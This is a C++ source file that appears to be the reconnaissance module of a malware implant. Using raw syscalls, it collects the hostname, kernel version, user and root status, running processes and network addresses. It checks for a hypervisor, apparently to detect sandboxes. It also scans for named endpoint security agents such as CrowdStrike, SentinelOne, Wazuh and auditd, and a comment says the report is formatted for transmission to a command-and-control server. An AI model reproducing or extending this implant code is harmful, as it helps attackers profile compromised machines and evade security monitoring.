#include "recon.h"
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <net/if.h>
#include <linux/dirent.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <cstring>
#include <sstream>
#include <vector>

// ============================================================================
// MINIMAL DEPENDENCY HELPERS
// ============================================================================

static int str_copy(char* dst, const char* src, int max_len) {
    int i = 0;
    while (i < max_len - 1 && src[i]) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
    return i;
}

static int hex_to_str(unsigned char value, char* buf) {
    const char hex[] = "0123456789abcdef";
    buf[0] = hex[(value >> 4) & 0xF];
    buf[1] = hex[value & 0xF];
    return 2;
}

static bool is_numeric(const char* str) {
    if (!str || !str[0]) return false;
    for (int i = 0; str[i]; i++) {
        if (str[i] < '0' || str[i] > '9') return false;
    }
    return true;
}

// ============================================================================
// HYPERVISOR DETECTION via CPUID
// ============================================================================

struct HypervisorInfo {
    bool present;
    char signature[13];
};

static HypervisorInfo detect_hypervisor_cpuid() {
    HypervisorInfo info = {false, {0}};
    
    #if defined(__x86_64__) || defined(__i386__)
    unsigned int eax, ebx, ecx, edx;
    
    // CPUID with EAX=1: Check hypervisor present bit
    eax = 1;
    __asm__ __volatile__(
        "cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(eax)
    );
    
    // Bit 31 of ECX indicates hypervisor presence
    if (ecx & (1u << 31)) {
        info.present = true;
        
        // CPUID with EAX=0x40000000: Get hypervisor vendor string
        eax = 0x40000000;
        __asm__ __volatile__(
            "cpuid"
            : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
            : "a"(eax)
        );
        
        // Vendor signature is in EBX, ECX, EDX (12 bytes)
        *((unsigned int*)&info.signature[0]) = ebx;
        *((unsigned int*)&info.signature[4]) = ecx;
        *((unsigned int*)&info.signature[8]) = edx;
        info.signature[12] = '\0';
    }
    #endif
    
    return info;
}

// ============================================================================
// PROCESS ENUMERATION via getdents64
// ============================================================================

struct linux_dirent64 {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

struct ProcessEntry {
    int pid;
    char comm[64];
    unsigned int uid;
};

static std::vector<ProcessEntry> enumerate_processes_full() {
    std::vector<ProcessEntry> processes;
    char buf[4096];
    
    int proc_fd = syscall(SYS_open, "/proc", O_RDONLY | O_DIRECTORY);
    if (proc_fd < 0) return processes;
    
    while (processes.size() < 512) {
        long nread = syscall(SYS_getdents64, proc_fd, buf, sizeof(buf));
        if (nread <= 0) break;
        
        for (long pos = 0; pos < nread;) {
            struct linux_dirent64* d = (struct linux_dirent64*)(buf + pos);
            
            if (d->d_type == DT_DIR && is_numeric(d->d_name)) {
                ProcessEntry entry = {0};
                
                // Convert PID
                for (int i = 0; d->d_name[i]; i++) {
                    entry.pid = entry.pid * 10 + (d->d_name[i] - '0');
                }
                
                // Build /proc/[pid]/comm path
                char comm_path[64] = "/proc/";
                int path_len = 6;
                for (int i = 0; d->d_name[i]; i++) 
                    comm_path[path_len++] = d->d_name[i];
                str_copy(comm_path + path_len, "/comm", 64 - path_len);
                
                // Read process name
                int comm_fd = syscall(SYS_open, comm_path, O_RDONLY);
                if (comm_fd >= 0) {
                    char comm_buf[64];
                    long bytes = syscall(SYS_read, comm_fd, comm_buf, sizeof(comm_buf) - 1);
                    if (bytes > 0) {
                        comm_buf[bytes] = '\0';
                        // Remove newline
                        for (int i = 0; i < bytes; i++) {
                            if (comm_buf[i] == '\n') comm_buf[i] = '\0';
                        }
                        str_copy(entry.comm, comm_buf, 64);
                        
                        // Read UID from /proc/[pid]/status
                        char status_path[64];
                        str_copy(status_path, "/proc/", 64);
                        path_len = 6;
                        for (int i = 0; d->d_name[i]; i++) 
                            status_path[path_len++] = d->d_name[i];
                        str_copy(status_path + path_len, "/status", 64 - path_len);
                        
                        int status_fd = syscall(SYS_open, status_path, O_RDONLY);
                        if (status_fd >= 0) {
                            char status_buf[1024];
                            bytes = syscall(SYS_read, status_fd, status_buf, sizeof(status_buf) - 1);
                            if (bytes > 0) {
                                status_buf[bytes] = '\0';
                                // Parse "Uid:\t1000\t..."
                                char* uid_line = strstr(status_buf, "Uid:");
                                if (uid_line) {
                                    uid_line += 4;
                                    while (*uid_line == '\t' || *uid_line == ' ') uid_line++;
                                    entry.uid = atoi(uid_line);
                                }
                            }
                            syscall(SYS_close, status_fd);
                        }
                        
                        processes.push_back(entry);
                    }
                    syscall(SYS_close, comm_fd);
                }
            }
            
            pos += d->d_reclen;
        }
    }
    
    syscall(SYS_close, proc_fd);
    return processes;
}

// ============================================================================
// NETWORK INTERFACE ENUMERATION via ioctl
// ============================================================================

struct NetworkInterface {
    char name[16];
    char mac[18];
    char ip[46];
};

static std::vector<NetworkInterface> enumerate_network_interfaces() {
    std::vector<NetworkInterface> interfaces;
    
    const char* if_names[] = {"lo", "eth0", "eth1", "wlan0", "ens33", "enp0s3", nullptr};
    
    int sock = syscall(SYS_socket, AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return interfaces;
    
    for (int i = 0; if_names[i]; i++) {
        struct ifreq ifr;
        memset(&ifr, 0, sizeof(ifr));
        str_copy(ifr.ifr_name, if_names[i], IFNAMSIZ);
        
        // Check if interface exists
        if (syscall(SYS_ioctl, sock, SIOCGIFFLAGS, &ifr) < 0) {
            continue;
        }
        
        NetworkInterface iface = {0};
        str_copy(iface.name, if_names[i], 16);
        
        // Get MAC address
        if (syscall(SYS_ioctl, sock, SIOCGIFHWADDR, &ifr) == 0) {
            unsigned char* m = (unsigned char*)ifr.ifr_hwaddr.sa_data;
            int pos = 0;
            for (int j = 0; j < 6; j++) {
                pos += hex_to_str(m[j], iface.mac + pos);
                if (j < 5) iface.mac[pos++] = ':';
            }
            iface.mac[pos] = '\0';
        }
        
        // Get IP address
        if (syscall(SYS_ioctl, sock, SIOCGIFADDR, &ifr) == 0) {
            struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
            inet_ntop(AF_INET, &addr->sin_addr, iface.ip, 46);
        }
        
        interfaces.push_back(iface);
    }
    
    syscall(SYS_close, sock);
    return interfaces;
}

// ============================================================================
// SECURITY PRODUCT DETECTION
// ============================================================================

static std::string detect_security_products(const std::vector<ProcessEntry>& processes) {
    const char* security_procs[] = {
        "ossec", "falco", "auditd", "crowdstrike", "falcon-sensor",
        "cb-agent", "sentinelagent", "wazuh", "osquery", nullptr
    };
    
    std::ostringstream detected;
    bool first = true;
    
    for (const auto& proc : processes) {
        for (int i = 0; security_procs[i]; i++) {
            if (strstr(proc.comm, security_procs[i])) {
                if (!first) detected << ",";
                detected << security_procs[i];
                first = false;
                break;
            }
        }
    }
    
    return detected.str();
}

// ============================================================================
// MAIN RECONNAISSANCE FUNCTION
// ============================================================================

std::string perform_full_recon() {
    std::ostringstream output;
    
    // System information
    struct utsname uts;
    char hostname[64] = "unknown";
    char kernel[128] = "unknown";
    
    if (syscall(SYS_uname, &uts) == 0) {
        snprintf(kernel, sizeof(kernel), "%s %s", uts.sysname, uts.release);
        str_copy(hostname, uts.nodename, 64);
    }
    
    // UID/GID
    unsigned int uid = syscall(SYS_getuid);
    unsigned int gid = syscall(SYS_getgid);
    bool is_root = (uid == 0);
    
    // Hypervisor detection
    HypervisorInfo hv = detect_hypervisor_cpuid();
    
    // Enumerate processes
    std::vector<ProcessEntry> processes = enumerate_processes_full();
    
    // Enumerate network interfaces
    std::vector<NetworkInterface> interfaces = enumerate_network_interfaces();
    
    // Detect security products
    std::string sec_products = detect_security_products(processes);
    
    // Format output (simplified text format for C2 transmission)
    output << "=== SYSTEM RECONNAISSANCE ===\n";
    output << "Hostname: " << hostname << "\n";
    output << "Kernel: " << kernel << "\n";
    output << "UID: " << uid << " | GID: " << gid << " | Root: " << (is_root ? "YES" : "NO") << "\n";
    output << "Virtualization: " << (hv.present ? hv.signature : "PHYSICAL") << "\n";
    output << "Security Products: " << (sec_products.empty() ? "None detected" : sec_products) << "\n";
    
    output << "\n--- NETWORK INTERFACES ---\n";
    for (const auto& iface : interfaces) {
        output << iface.name << " | MAC: " << iface.mac << " | IP: " << iface.ip << "\n";
    }
    
    output << "\n--- PROCESSES (Top 20) ---\n";
    int count = 0;
    for (const auto& proc : processes) {
        if (count++ >= 20) break;
        output << "PID: " << proc.pid << " | UID: " << proc.uid << " | " << proc.comm << "\n";
    }
    
    output << "\n=== END RECON ===\n";
    
    return output.str();
}
